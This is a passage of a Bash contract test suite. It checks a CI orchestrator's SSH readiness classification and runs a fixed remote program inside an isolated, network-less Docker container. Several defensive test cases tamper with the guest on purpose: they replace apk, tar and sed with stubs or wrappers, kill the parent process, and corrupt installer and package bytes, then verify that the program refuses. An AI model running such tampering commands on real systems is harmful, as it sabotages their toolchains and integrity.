    printf '%s|%s\n' "$ORCH_SSH_ATTEMPT_READY" "$ORCH_SSH_ATTEMPT_RC"
  ) || fail "$label direct ssh attempt probe failed to run"
  [[ $observed == "$expect_ready|$expect_rc" ]] ||
    fail "$label direct ssh attempt observed $observed, expected $expect_ready|$expect_rc"
}
ssh_leg_attempt_case capped-unmarked unmarked-hang 300 2 false 124
ssh_leg_attempt_case capped-marked marked-fast 300 2 true 0
ssh_leg_attempt_case capped-late-marker late-marker 300 2 false 124
# The capped-window race: when the aggregate remainder EQUALS the marker
# watchdog, GNU timeout fires at the same instant the watchdog gives up. The
# child is then terminated by timeout rather than by the stop helper, so it
# looks like a voluntary exit and a watchdog_stopped flag set only on the
# stop path stays false -- letting a marker printed from the child's TERM
# handler win the post-reap scan. A marker produced by the deadline that killed
# the session is never evidence the session started in time.
ssh_leg_attempt_case racing-late-marker late-marker 2 2 false 124
ssh_leg_attempt_case racing-late-marker-tight late-marker 1 1 false 124
# The freeze must not overreach. A child that genuinely exits on its own at the
# same capped values, having emitted the marker as its first complete line,
# must still be admitted by the post-reap scan -- otherwise the fix for the
# race would start rejecting healthy fast sessions instead.
ssh_leg_attempt_case racing-marked marked-fast 2 2 true 0
# A child that survives the initial scan and then exits of its own accord with
# the marker must still be ready at capped values -- nothing killed it. This
# runs at 2/2 rather than 1/1 deliberately: `SECONDS` has one-second
# granularity, so a watchdog of N gives a real window anywhere in [N-1, N], and
# at N=1 that window can be under the child's own delay. Pinning 1/1 made this
# case pass in isolation and fail under load, which is a flaky gate, not a
# finding. Which internal branch admits it (the later poll or the post-reap
# scan) is not deterministically selectable with one-second polling, so the
# behavioural gate binds the OUTCOME and the static gates above bind the
# post-reap path itself -- the unconditional stored scan and its two-cause
# upgrade. Together those cover the rule without asserting a race.
ssh_leg_attempt_case racing-marked-between-polls marked-between-polls 2 2 true 0
ok 'a watchdog capped by the aggregate remainder still freezes an unmarked attempt as unready'
ok 'the capped-boundary freeze still admits a naturally exited marked session'

# The attempt probe above proves readiness and status, but classification lives
# in orchestrate and reads a caller-local aggregate-exhaustion flag, so the two
# readiness-first branches are not reachable from it. Extract the real chain and
# drive it directly across the full truth table, so a capped aggregate deadline
# is proved to yield the session-start class rather than the driver class.
ssh_leg_classifier=$scratch/ssh-leg-classifier.sh
# The emitted lines are shell source for the extracted chain, not expansions.
# shellcheck disable=SC2016
{
  printf '%s\n' 'orchestrator_fail() { printf "%s\n" "$2" >/dev/null; }'
  printf '%s\n' 'DIENE_REASON_EXIT=64'
  printf '%s\n' 'ssh_leg_classify() {'
  printf '%s\n' '  ssh_rc=$1 ssh_ready=$2 ssh_aggregate_exhausted=$3 ssh_attempt=$4'
  printf '%s\n' '  ORCH_SSH_OUTCOME= ORCH_SSH_REASON='
  awk '/^  if \(\(ssh_rc == 0\)\) && \[\[ \$ssh_ready == true \]\]; then$/{inside=1}
    inside {print}
    inside && /^  fi$/{exit}' "$ssh_leg_source"
  printf '%s\n' '  printf "%s|%s\n" "$ORCH_SSH_OUTCOME" "$ORCH_SSH_REASON"'
  printf '%s\n' '}'
} >"$ssh_leg_classifier"
[[ $(grep -c 'ORCH_SSH_REASON=NamespaceSshDriverTimedOut' "$ssh_leg_classifier") == 1 &&
  $(grep -c 'ORCH_SSH_REASON=NamespaceSshSessionStartTimedOut' "$ssh_leg_classifier") == 1 &&
  $(grep -c 'ORCH_SSH_REASON=NamespaceSshSessionStartUnproven' "$ssh_leg_classifier") == 1 &&
  $(grep -c 'ORCH_SSH_REASON=NamespaceSshDriverFailed' "$ssh_leg_classifier") == 1 ]] ||
  fail 'the production ssh classification chain could not be isolated intact'
bash -n "$ssh_leg_classifier" ||
  fail 'the isolated ssh classification chain is not valid Bash'
# shellcheck source=/dev/null
source "$ssh_leg_classifier"
ssh_leg_classify_case() {
  local rc=${1:?} ready=${2:?} exhausted=${3:?} attempt=${4:?} expected=${5:?}
  local observed
  observed=$(ssh_leg_classify "$rc" "$ready" "$exhausted" "$attempt")
  [[ $observed == "$expected" ]] ||
    fail "ssh classification of rc=$rc ready=$ready exhausted=$exhausted attempt=$attempt was $observed, expected $expected"
}
# Readiness is tested first: the SAME status and the SAME aggregate expiry must
# split into two different classes purely on whether the session proved itself.
ssh_leg_classify_case 124 false true 2 'Fail|NamespaceSshSessionStartTimedOut'
ssh_leg_classify_case 124 true true 2 'Fail|NamespaceSshDriverTimedOut'
ssh_leg_classify_case 0 false true 2 'Fail|NamespaceSshSessionStartTimedOut'
# A marked zero cannot coexist with aggregate exhaustion in production, because
# exhaustion is only ever recorded alongside a 124. Assert the safe resolution
# anyway: a proven-complete driver is a pass and a stale flag never reddens it.
ssh_leg_classify_case 0 true true 2 'Pass|NonInteractiveDriverCompletedAfterSshSessionRetry'
# Status-driven timeouts split the same way with no aggregate expiry at all.
ssh_leg_classify_case 124 false false 1 'Fail|NamespaceSshSessionStartTimedOut'
ssh_leg_classify_case 137 false false 2 'Fail|NamespaceSshSessionStartTimedOut'
ssh_leg_classify_case 124 true false 1 'Fail|NamespaceSshDriverTimedOut'
ssh_leg_classify_case 137 true false 2 'Fail|NamespaceSshDriverTimedOut'
# Everything else, including the fail-closed unmarked zero.
ssh_leg_classify_case 0 false false 1 'Fail|NamespaceSshSessionStartUnproven'
ssh_leg_classify_case 42 false false 1 'Fail|NamespaceSshDriverFailed'
ssh_leg_classify_case 42 true false 2 'Fail|NamespaceSshDriverFailed'
ssh_leg_classify_case 143 true false 1 'Fail|NamespaceSshDriverFailed'
ssh_leg_classify_case 130 false false 1 'Fail|NamespaceSshDriverFailed'
ssh_leg_classify_case 0 true false 1 'Pass|NonInteractiveDriverCompleted'
ssh_leg_classify_case 0 true false 2 'Pass|NonInteractiveDriverCompletedAfterSshSessionRetry'
ok 'the real classification chain splits marked and unmarked timeouts on readiness first'

printf '== the complete fixed remote rail executes in a disposable guest ==\n'

guest_rail_image='cgr.dev/chainguard/wolfi-base@sha256:003627df3c1e1bba0c4116afcddb314aca9594ee2328c7e876a8081a6c988b2e'
command -v docker >/dev/null 2>&1 ||
  fail 'Docker is required for the disposable guest execution fixture'
docker info >/dev/null 2>&1 ||
  fail 'the Docker daemon is unavailable for the disposable guest execution fixture'
docker image inspect "$guest_rail_image" >/dev/null 2>&1 ||
  fail 'the immutable Wolfi image is absent for the disposable guest execution fixture'
guest_rail_docker_options=(
  --rm
  --pull=never
  --network=none
  --cap-drop=ALL
  --security-opt no-new-privileges
  --label "diene.contract.guest-rail=$$"
  --entrypoint /usr/bin/busybox
)
if ! docker run "${guest_rail_docker_options[@]}" "$guest_rail_image" ash -c '
  set -eu
  [ "$(id -u)" = 0 ]
  [ ! -e /nix ] && [ ! -L /nix ]
  [ ! -e /etc/nix ] && [ ! -L /etc/nix ]
  for command in ash env sed tr id install cd sha256sum chmod wc cat printf uname \
    readlink sort cut tar find awk mktemp rm grep ln cp; do
    command -v "$command" >/dev/null 2>&1
  done
' >/dev/null 2>&1; then
  fail 'the disposable guest execution fixture cannot obtain a clean uid-0 Wolfi root'
fi
if ! docker run -i "${guest_rail_docker_options[@]}" "$guest_rail_image" \
  ash -n <"$work_remote_command" >/dev/null 2>&1; then
  fail 'the exact synthetic-pin remote program is not valid Wolfi BusyBox ash syntax'
fi
ok 'the required immutable uid-0 Wolfi ash execution vehicle is locally available and fail-closed'

guest_rail_container_program=$(cat <<'GUEST_RAIL_CONTAINER'
set -eu
[ "$(id -u)" = 0 ]
[ ! -e /nix ] && [ ! -L /nix ]
[ ! -e /etc/nix ] && [ ! -L /etc/nix ]
install -d -m 0700 /run/diene-ci
tar -xf - -C /run/diene-ci
cd /run/diene-ci
sha256sum -c remote-program.sha256 >/dev/null
printf '%s\n' 'uid=0' 'nix=absent' 'etcNix=absent' 'shell=busybox-ash' \
  >harness/initial-state
: >harness/remote.stdout
: >harness/remote.stderr
chmod 0600 harness/initial-state harness/remote.stdout harness/remote.stderr
rail_scenario=$(cat harness/scenario)
# Guest-side hostile injections. They mutate the disposable image, never the
# fixed program, so stage 0 is measured against the guest it actually gets.
case $rail_scenario in
  g4-apk-absent) rm -f /usr/bin/apk ;;
  g6-identity-rebind)
    mv /usr/bin/apk /usr/bin/apk.real
    printf '%s\n' '#!/bin/sh' 'set -e' '/usr/bin/apk.real "$@"' 'rm -f /usr/bin/sed' \
      'ln -s /usr/bin/busybox /usr/bin/sed' >/usr/bin/apk
    chmod 0755 /usr/bin/apk
    ;;
  g7-tar-stub)
    rm -f /usr/bin/tar
    printf '%s\n' '#!/bin/sh' 'exit 0' >/usr/bin/tar
    chmod 0755 /usr/bin/tar
    ;;
  g8-apk-noop)
    rm -f /usr/bin/apk
    printf '%s\n' '#!/bin/sh' 'exit 0' >/usr/bin/apk
    chmod 0755 /usr/bin/apk
    ;;
  g10-cancel)
    mv /usr/bin/apk /usr/bin/apk.real
    printf '%s\n' '#!/bin/sh' 'kill -TERM "$PPID"' 'sleep 5' 'exit 0' >/usr/bin/apk
    chmod 0755 /usr/bin/apk
    ;;
  g12-no-network) : >/lib/apk/db/installed ;;
esac
if [ "$rail_scenario" = g11-rerun ]; then
  : >harness/first.stdout
  : >harness/first.stderr
  chmod 0600 harness/first.stdout harness/first.stderr
  set +e
  /usr/bin/busybox ash /run/diene-ci/remote-program \
    >harness/first.stdout 2>harness/first.stderr
  printf '%s\n' "$?" >harness/first.rc
  set -e
  chmod 0600 harness/first.rc
fi
set +e
/usr/bin/busybox ash /run/diene-ci/remote-program \
  >harness/remote.stdout 2>harness/remote.stderr
rail_rc=$?
set -e
printf '%s\n' "$rail_rc" >harness/remote.rc
chmod 0600 harness/remote.rc
if [ -f /etc/nix/nix.conf ] && [ ! -L /etc/nix/nix.conf ]; then
  install -m 0600 /etc/nix/nix.conf harness/final-nix.conf
fi
guest_rail_profile=/nix/var/nix/profiles/default/etc/profile.d/nix-daemon.sh
if [ -e "$guest_rail_profile" ] || [ -L "$guest_rail_profile" ]; then
  if readlink -f "$guest_rail_profile" >harness/profile.resolved 2>/dev/null; then
    :
  else
    : >harness/profile.resolved
  fi
  chmod 0600 harness/profile.resolved
fi
# The collection tar is spelled through BusyBox directly: a hostile case may
# have replaced /usr/bin/tar, and the state archive must still come back.
/usr/bin/busybox tar -cf - -C /run/diene-ci .
exit "$rail_rc"
GUEST_RAIL_CONTAINER
)

guest_rail_uploaded_files=(
  archive-validator.sh
  archive-validator.sha256
  artifact-subject.json
  egress-contract.json
  guest-nix-bootstrap.sh
  guest-nix-bootstrap.sha256
  guest-nix-installer
  guest-nix-installer.sha256
  inputs.json
  receipt.json
  source.tar
)
for guest_toolchain_file in "${guest_toolchain_files[@]}"; do
  guest_rail_uploaded_files+=("gnu/$guest_toolchain_file" "gnu/$guest_toolchain_file.sha256")
done
[[ ${#guest_rail_uploaded_files[@]} == 31 ]] ||
  fail 'the disposable guest seed is not the exact thirty-one uploaded transfer set'

guest_rail_prepare_seed() {
  local seed=${1:?guest rail seed required} scenario=${2:?guest rail scenario required}
  local mutation=${3:-none} uploaded changed_digest
  install -d -m 0700 "$seed" "$seed/harness" "$seed/gnu"
  for uploaded in "${guest_rail_uploaded_files[@]}"; do
    [[ -f $happy_instance_state/$uploaded && ! -L $happy_instance_state/$uploaded ]] ||
      fail "the real post-upload guest seed is missing $uploaded"
    install -m 0600 "$happy_instance_state/$uploaded" "$seed/$uploaded"
  done
  install -m 0600 "$work_remote_command" "$seed/remote-program"
  (cd "$seed" && sha256sum remote-program >remote-program.sha256)
  chmod 0600 "$seed/remote-program.sha256"
  printf '%s\n' "$scenario" >"$seed/harness/scenario"
  chmod 0600 "$seed/harness/scenario"
  case $mutation in
    payload-pair)
      printf X | dd of="$seed/guest-nix-installer" bs=1 seek=0 conv=notrunc status=none
      (cd "$seed" && sha256sum guest-nix-installer >guest-nix-installer.sha256)
      chmod 0600 "$seed/guest-nix-installer" "$seed/guest-nix-installer.sha256"
      (cd "$seed" && sha256sum -c guest-nix-installer.sha256 >/dev/null) ||
        fail 'the hostile changed asset and sidecar are not a self-consistent pair'
      changed_digest="sha256:$(sha256sum "$seed/guest-nix-installer" | awk '{print $1}')"
      [[ $changed_digest != "$guest_nix_fixture_payload_digest" ]] ||
        fail 'the hostile changed asset pair did not diverge from the admitted payload pin'
      ;;
    apk-pair)
      printf X | dd of="$seed/gnu/coreutils-9.11-r3.apk" bs=1 seek=0 conv=notrunc status=none
      (cd "$seed/gnu" && sha256sum coreutils-9.11-r3.apk >coreutils-9.11-r3.apk.sha256)
      chmod 0600 "$seed/gnu/coreutils-9.11-r3.apk" "$seed/gnu/coreutils-9.11-r3.apk.sha256"
      (cd "$seed/gnu" && sha256sum -c coreutils-9.11-r3.apk.sha256 >/dev/null) ||
        fail 'the hostile changed package and sidecar are not a self-consistent pair'
      ;;
    apk-missing) rm -- "$seed/gnu/sed-4.10-r1.apk" ;;
    apk-symlink)
      cp "$seed/gnu/grep-3.12-r6.apk" "$seed/gnu/grep-3.12-r6.apk.link-target"
      rm -- "$seed/gnu/grep-3.12-r6.apk"
      ln -s grep-3.12-r6.apk.link-target "$seed/gnu/grep-3.12-r6.apk"
      ;;
    validator-order)
      # An ordering probe, not an integrity probe: the real validator is kept
      # intact behind a wrapper that records whether the proven-GNU stage-0
      # record already existed the moment climb code first ran.
      mv "$seed/archive-validator.sh" "$seed/archive-validator.real.sh"
      cat >"$seed/archive-validator.sh" <<'GUEST_RAIL_ORDER_PROBE'
#!/bin/sh
set -eu
if [ -f /run/diene-ci/evidence/gnu-toolchain/identity.txt ]; then
  printf '%s\n' stage0-preceded-validator >/run/diene-ci/harness/order
else
  printf '%s\n' stage0-missing-at-validator >/run/diene-ci/harness/order
fi
chmod 0600 /run/diene-ci/harness/order
exec /bin/sh /run/diene-ci/archive-validator.real.sh "$@"
GUEST_RAIL_ORDER_PROBE
      chmod 0600 "$seed/archive-validator.sh" "$seed/archive-validator.real.sh"
      (cd "$seed" && sha256sum archive-validator.sh >archive-validator.sha256)
      chmod 0600 "$seed/archive-validator.sha256"
      ;;
    none) ;;
    *) fail "unknown guest rail seed mutation $mutation" ;;
  esac
}

guest_rail_assert_safe_records() {
  local result=${1:?guest rail result required} record
  for record_root in "$result/harness" "$result/evidence" "$result/receipts"; do
    [[ -d $record_root ]] || continue
    while IFS= read -r -d '' record; do
      [[ $(stat -c %a -- "$record") == 600 ]] ||
        fail "the disposable guest retained a non-0600 evidence record: $record"
    done < <(find "$record_root" -type f -print0)
  done
  if [[ -d $result/evidence ]]; then
    while IFS= read -r -d '' record; do
      [[ $(stat -c %a -- "$record") == 700 ]] ||
        fail "the disposable guest retained a non-0700 evidence directory: $record"
    done < <(find "$result/evidence" -type d -print0)
  fi
}

guest_rail_run_case() {
  local label=${1:?guest rail case label required} scenario=${2:?guest rail scenario required}
  local expected_rc=${3:?expected guest rail rc required} expected_reason=${4-}
  local root=$scratch/guest-rail/$label seed result seed_tar result_tar docker_error
  local mutation=none rail_rc=0 stage0_refusal=false retry_probe=false
  local -a guest_environment=()
  seed=$root/seed
  result=$root/result
  seed_tar=$root/seed.tar
  result_tar=$root/result.tar
  docker_error=$root/docker.stderr
  install -d -m 0700 "$root" "$result"
  case $label in
    S1) mutation='payload-pair' ;;
    S2) guest_environment=(--env 'NIX_INSTALLER_EXTRA_CONF=guest-rail-secret-extra') ;;
    S3) guest_environment=(--env 'NIX_CONFIG=guest-rail-secret-config') ;;
    G1) mutation='apk-pair'; stage0_refusal=true ;;
    G2) mutation='apk-missing'; stage0_refusal=true ;;
    G3) mutation='apk-symlink'; stage0_refusal=true ;;
    G4 | G6 | G7 | G8 | G10 | G12) stage0_refusal=true ;;
    G5) guest_environment=(--env 'APK_CONFIG=guest-rail-secret-apk'); stage0_refusal=true ;;
    G9) mutation='validator-order' ;;
    # G11 legitimately reruns a completed pass, so its first leg owns the green
    # records the hostile forbidden-artifact list exists to forbid.
    G11) retry_probe=true ;;
  esac
  guest_rail_prepare_seed "$seed" "$scenario" "$mutation"
  tar --owner=0 --group=0 --numeric-owner -cf "$seed_tar" -C "$seed" .
  if docker run -i "${guest_rail_docker_options[@]}" "${guest_environment[@]}" \
    "$guest_rail_image" ash -c "$guest_rail_container_program" \
    <"$seed_tar" >"$result_tar" 2>"$docker_error"; then
    rail_rc=0
  else
    rail_rc=$?
  fi
  if [[ $expected_rc == nonzero ]]; then
    if [[ $rail_rc == 0 ]]; then
      sed -n '1,160p' "$docker_error" >&2
      fail "$label disposable guest unexpectedly returned zero"
    fi
  elif [[ $rail_rc != "$expected_rc" ]]; then
    sed -n '1,160p' "$docker_error" >&2
    fail "$label disposable guest returned $rail_rc instead of $expected_rc"
  fi
  tar -tf "$result_tar" >/dev/null 2>&1 || {
    sed -n '1,160p' "$docker_error" >&2
    fail "$label disposable guest did not return a complete state archive"
  }
  tar -xf "$result_tar" -C "$result"
  [[ $(cat "$result/harness/remote.rc") == "$rail_rc" ]] ||
    fail "$label Docker rc disagrees with the exact remote program rc"
  cmp -s "$work_remote_command" "$result/remote-program" ||
    fail "$label did not execute the exact materialized synthetic-pin program bytes"
  grep -Fxq -- 'shell=busybox-ash' "$result/harness/initial-state" ||
    fail "$label did not execute the exact program under Wolfi BusyBox ash"
  grep -Fxq -- 'nix=absent' "$result/harness/initial-state" ||
    fail "$label began with /nix pre-created"
  grep -Fxq -- 'etcNix=absent' "$result/harness/initial-state" ||
    fail "$label began with /etc/nix pre-created"
  guest_rail_assert_safe_records "$result"
  GUEST_RAIL_RESULT=$result
  if [[ $expected_rc == 0 ]]; then
    [[ -z $expected_reason && ! -s $result/harness/remote.stderr ]] ||
      fail "$label successful exact rail emitted an unexpected refusal"
    return
  fi
  if [[ $expected_rc == nonzero ]]; then
    [[ -z $expected_reason ]] ||
      fail "$label nonzero rail expectation unexpectedly names a stable refusal class"
  else
    [[ $expected_rc == 64 && -n $expected_reason ]] ||
      fail "$label hostile rail expectation is not a stable exit-64 refusal"
    grep -Fq -- "$expected_reason:" "$result/harness/remote.stderr" || {
      sed -n '1,160p' "$result/harness/remote.stderr" >&2
      fail "$label exact rail emitted no stable $expected_reason refusal"
    }
    [[ $(grep -Ec '^Guest(Nix|Toolchain)[A-Za-z]+:' "$result/harness/remote.stderr") == 1 ]] ||
      fail "$label exact rail did not emit exactly one stable guest refusal class"
  fi
  if [[ $stage0_refusal == true ]]; then
    # A refused bootstrap may not leave a proven-GNU record, and it may not have
    # reached any climb code: the fake installer's event log is the first thing
    # the rail writes after stage 0.
    for forbidden_stage0 in \
      "$result/evidence/gnu-toolchain/identity.txt" \
      "$result/harness/events" \
      "$result/source"; do
      [[ ! -e $forbidden_stage0 && ! -L $forbidden_stage0 ]] ||
        fail "$label stage-0 refusal left an identity record or reached climb code"
    done
  fi
  if [[ $retry_probe == true ]]; then
    ok "$label executes the exact rail twice and refuses $expected_reason with no partial state"
    return
  fi
  for forbidden_green in \
    "$result/evidence/gnu-toolchain/identity.json" \
    "$result/evidence/guest-nix/version.txt" \
    "$result/evidence/guest-nix/version.stderr" \
    "$result/evidence/guest-nix/identity.json" \
    "$result/evidence/guest-nix/live-version.txt" \
    "$result/harness/nix-version.argv" \
    "$result/harness/nix-develop.argv" \
    "$result/harness/nix-develop.cwd" \
    "$result/harness/nix-develop.env" \
    "$result/harness/installed-copy.sha256" \
    "$result/out/proof.tar" \
    "$result/out/proof.sha256"; do
    [[ ! -e $forbidden_green && ! -L $forbidden_green ]] ||
      fail "$label hostile rail created green identity or reached the Nix stub"
  done
  if [[ -d $result/evidence || -d $result/receipts ]]; then
    # Stage 0's identity.txt is the proven-GNU bootstrap record that legitimately
    # precedes every later refusal; the green preflight record is identity.json
    # and it stays forbidden above for every case, including stage-0 refusals.
    ! find "$result/evidence" "$result/receipts" -type f \
      ! -path '*/gnu-toolchain/identity.txt' \
      \( -iname '*identity*' -o -iname '*preflight*' \) -print 2>/dev/null | grep -q . ||
      fail "$label hostile rail created a green identity/preflight record"
  fi
  if [[ $expected_rc == nonzero ]]; then
    ok "$label executes the exact rail and fails closed before direct Nix (observed rc $rail_rc)"
  else
    ok "$label executes the exact rail and refuses $expected_reason before direct Nix"
  fi
}

# The fixed remote program's whole stdout, in order. The session-start contract
# requires the ready marker to be the first complete line, so the rail's stdout
# is the marker followed by the one archive-validator receipt and nothing else.
# Kept as an exact equality rather than a substring or line-count test: an extra
# line, a reorder, or a missing marker must all still fail.
guest_rail_expected_stdout=$'DieneNscSshSessionReady:v1\narchive-validator.sh: OK'

guest_rail_assert_post_profile_refusal() {
  local scenario=${1:?profile injection scenario required}
  local environment_mode=${2:?profile environment expectation required}
  local result=$GUEST_RAIL_RESULT forbidden_stub
  grep -Fxq -- "$scenario" "$result/harness/injection-ran" ||
    fail "$scenario did not leave its unconditional injection marker"
  grep -Fxq -- "$scenario = true" "$result/harness/final-nix.conf" ||
    fail "$scenario did not really mutate /etc/nix/nix.conf"
  if [[ $environment_mode == present ]]; then
    [[ -f $result/evidence/guest-nix/environment.txt ]] ||
      fail "$scenario did not reach the pristine post-profile evidence stage"
  elif [[ $environment_mode == absent ]]; then
    [[ ! -e $result/evidence/guest-nix/environment.txt &&
      ! -L $result/evidence/guest-nix/environment.txt ]] ||
      fail "$scenario wrote post-profile environment evidence before refusal"
  else
    fail "$scenario has an unknown profile environment expectation"
  fi
  if [[ -f $result/evidence/guest-nix/environment.txt ]]; then
    ! grep -q '^etcNixConf=' "$result/evidence/guest-nix/environment.txt" ||
      fail "$scenario published a green Nix configuration binding after refusal"
  fi
  [[ -d $result/out && -z $(find "$result/out" -mindepth 1 -print -quit) ]] ||
    fail "$scenario left a publication artifact after refusal"
  for forbidden_stub in \
    "$result/harness/nix-version.argv" \
    "$result/harness/nix-develop.argv" \
    "$result/harness/nix-develop.cwd" \
    "$result/harness/nix-develop.env"; do
    [[ ! -e $forbidden_stub && ! -L $forbidden_stub ]] ||
      fail "$scenario reached the direct Nix stub"
  done
  [[ $(cat "$result/harness/remote.stdout") == "$guest_rail_expected_stdout" ]] ||
    fail "$scenario emitted output after the archive-validator receipt"
}

guest_rail_profile_refusal_case() {
  local label=${1:?profile refusal label required}
  local scenario=${2:?profile refusal scenario required}
  local reason=${3:?profile refusal class required}
  local message=${4:?profile refusal message required}
  local environment_mode=${5:?profile environment expectation required}
  guest_rail_run_case "$label" "$scenario" 64 "$reason"
  [[ $(cat "$GUEST_RAIL_RESULT/harness/remote.stderr") == "$reason: $message" ]] || {
    sed -n '1,160p' "$GUEST_RAIL_RESULT/harness/remote.stderr" >&2
    fail "$label did not emit the one exact measured profile-isolation refusal"
  }
  guest_rail_assert_post_profile_refusal "$scenario" "$environment_mode"
}

guest_rail_run_case S0 happy 0 ''
guest_rail_happy=$GUEST_RAIL_RESULT
[[ $(cat "$guest_rail_happy/harness/remote.stdout") == "$guest_rail_expected_stdout" ]] || {
  sed -n '1,160p' "$guest_rail_happy/harness/remote.stdout" >&2
  fail 'S0 exact remote program stdout is not the ready marker then the archive-validator receipt'
}
cat >"$scratch/guest-rail-expected-events" <<'GUEST_RAIL_EVENTS'
uploads-verified
installer-version
installer-install
nix-config-bound
profile-resolved
profile-sourced
environment-bound
nix-config-rechecked
direct-nix-version
nix-develop
GUEST_RAIL_EVENTS
diff -u "$scratch/guest-rail-expected-events" "$guest_rail_happy/harness/events" >/dev/null ||
  fail 'S0 did not retain the exact ordered fixed-rail observations'
ok 'S0 executes the complete fixed rail in its exact observable order'

# The single most important assertion in this change: the whole rail above is
# green *after* sed, grep, awk, sha256sum, find and xargs were really replaced.
guest_rail_toolchain=$guest_rail_happy/evidence/gnu-toolchain
guest_toolchain_write_expected_pins >"$scratch/guest-rail-expected-pins.txt"
diff -u "$scratch/guest-rail-expected-pins.txt" "$guest_rail_toolchain/pins.txt" >/dev/null ||
  fail 'S0 did not record the exact admitted ten-package offline pin evidence'
guest_toolchain_write_expected_identity >"$scratch/guest-rail-expected-identity.txt"
diff -u "$scratch/guest-rail-expected-identity.txt" "$guest_rail_toolchain/identity.txt" >/dev/null ||
  fail 'S0 did not prove the exact twenty-one absolute-path GNU utilities and BusyBox tar'
grep -Fq -- 'Installing coreutils (9.11-r3)' "$guest_rail_toolchain/install.log" ||
  fail 'S0 did not really install the pinned Wolfi coreutils package offline'
grep -Fq -- 'OK: ' "$guest_rail_toolchain/install.log" ||
  fail 'S0 offline package install did not complete'
[[ ! -e $guest_rail_toolchain/identity.json && ! -L $guest_rail_toolchain/identity.json ]] ||
  fail 'stage 0 published a preflight identity receipt the runner alone may write'
[[ $(find "$guest_rail_toolchain" -maxdepth 1 -name '*-version.txt' | wc -l) == 21 &&
  $(find "$guest_rail_toolchain" -maxdepth 1 -name '*-version.stderr' -size +0 | wc -l) == 0 ]] ||
  fail 'S0 did not retain twenty-one clean absolute-path identity probes'
grep -Fq -- '(GNU sed) ' "$guest_rail_toolchain/sed-version.txt" ||
  fail 'S0 lost the raw GNU sed identity output'
grep -Fq -- '(GNU coreutils) ' "$guest_rail_toolchain/sha256sum-version.txt" ||
  fail 'S0 lost the raw GNU coreutils identity output'
assert_not_contains "$guest_rail_happy/harness/remote.stdout" Installing
assert_not_contains "$guest_rail_happy/harness/remote.stderr" Installing
[[ -z $(find "$guest_rail_happy/tmp" -maxdepth 1 -name 'gnu-toolchain.*' -print -quit 2>/dev/null) ]] ||
  fail 'S0 left its guest toolchain behaviour scratch directory behind'
for guest_toolchain_file in "${guest_toolchain_files[@]}"; do
  [[ $(stat -c %a -- "$guest_rail_happy/gnu/$guest_toolchain_file") == 600 ]] ||
    fail "S0 did not seal the verified package $guest_toolchain_file at mode 0600"
done
ok 'S0 really installs the pinned offline Wolfi closure, proves GNU identity, and leaks no apk output'

cat >"$scratch/guest-rail-version.env" <<'GUEST_RAIL_VERSION_ENV'
HOME=/run/diene-ci/home
LC_ALL=C
PATH=/usr/sbin:/usr/bin:/sbin:/bin
TMPDIR=/run/diene-ci/tmp
GUEST_RAIL_VERSION_ENV
cat >"$scratch/guest-rail-install.env" <<'GUEST_RAIL_INSTALL_ENV'
HOME=/run/diene-ci/home
LC_ALL=C
NIX_INSTALLER_DIAGNOSTIC_ENDPOINT=
PATH=/usr/sbin:/usr/bin:/sbin:/bin
TMPDIR=/run/diene-ci/tmp
GUEST_RAIL_INSTALL_ENV
diff -u "$scratch/guest-rail-version.env" \
  "$guest_rail_happy/harness/installer-version.env" >/dev/null ||
  fail 'S0 version probe did not inherit the exact env -i capsule'
diff -u "$scratch/guest-rail-install.env" \
  "$guest_rail_happy/harness/installer-install.env" >/dev/null ||
  fail 'S0 install did not inherit the exact env -i capsule and empty diagnostic endpoint'
printf '%s\n' --version >"$scratch/guest-rail-version.argv"
printf '%s\n' install linux --no-confirm --init none >"$scratch/guest-rail-install.argv"
diff -u "$scratch/guest-rail-version.argv" \
  "$guest_rail_happy/harness/installer-version.argv" >/dev/null ||
  fail 'S0 did not retain the exact installer version argv'
diff -u "$scratch/guest-rail-install.argv" \
  "$guest_rail_happy/harness/installer-install.argv" >/dev/null ||
  fail 'S0 did not retain the exact installer install argv'
ok 'S0 empirically proves both exact env -i capsules and installer argv vectors'

guest_rail_expected_verified=$scratch/guest-rail-expected-verified
printf '%s\n' \
  "${guest_nix_fixture_installer_digest#sha256:}  guest-nix-bootstrap.sh" \
  "${guest_nix_fixture_payload_digest#sha256:}  guest-nix-installer" \
  'executionMode=direct-pinned-binary' 'payloadDigestVerified=true' \
  >"$guest_rail_expected_verified"
diff -u "$guest_rail_expected_verified" \
  "$guest_rail_happy/evidence/guest-nix/verified.txt" >/dev/null ||
  fail 'S0 lost exact direct-pinned-binary upload identity evidence'
grep -Fxq -- 'nix-installer 3.21.9' \
  "$guest_rail_happy/evidence/guest-nix/installer-version.txt" ||
  fail 'S0 lost the exact pinned installer version output'
[[ $(wc -c <"$guest_rail_happy/evidence/guest-nix/installer-version.txt") == 21 &&
  ! -s $guest_rail_happy/evidence/guest-nix/installer-version.stderr &&
  ! -s $guest_rail_happy/evidence/guest-nix/install.log ]] ||
  fail 'S0 did not retain exact raw installer output and an empty successful install log'
grep -Fxq -- 'nix (Determinate Nix 3.21.9) 2.34.8' \
  "$guest_rail_happy/evidence/guest-nix/version.txt" ||
  fail 'S0 lost the direct installed Nix identity output'
[[ $(wc -c <"$guest_rail_happy/evidence/guest-nix/version.txt") == 36 &&
  ! -s $guest_rail_happy/evidence/guest-nix/version.stderr ]] ||
  fail 'S0 direct installed Nix identity output is not exact'
grep -Fxq -- "${guest_nix_fixture_payload_digest#sha256:}  /nix/nix-installer" \
  "$guest_rail_happy/harness/installed-copy.sha256" ||
  fail 'S0 installed-copy digest does not bind the directly executed pinned payload'
ok 'S0 binds exact installer output, direct payload identity, and direct installed Nix identity'

guest_rail_nix_conf=$scratch/guest-rail-nix.conf
printf '%s\n' 'sandbox = false' >"$guest_rail_nix_conf"
guest_rail_nix_conf_digest=$(sha256sum "$guest_rail_nix_conf" | awk '{print $1}')
cat >"$scratch/guest-rail-environment.txt" <<GUEST_RAIL_ENVIRONMENT
inheritedNixFamily=none
profileNixVar=NIX_PROFILES
profileNixVar=NIX_SSL_CERT_FILE
home=/run/diene-ci/home
xdgConfigHome=/run/diene-ci/home/.config
userConfFiles=/run/diene-ci/nix-user.conf
etcNixConf=$guest_rail_nix_conf_digest
GUEST_RAIL_ENVIRONMENT
diff -u "$scratch/guest-rail-environment.txt" \
  "$guest_rail_happy/evidence/guest-nix/environment.txt" >/dev/null ||
  fail 'S0 profile/config evidence does not bind the exact reviewed environment'
diff -u "$guest_rail_nix_conf" "$guest_rail_happy/harness/final-nix.conf" >/dev/null ||
  fail 'S0 did not retain the exact bound and rechecked /etc/nix/nix.conf'
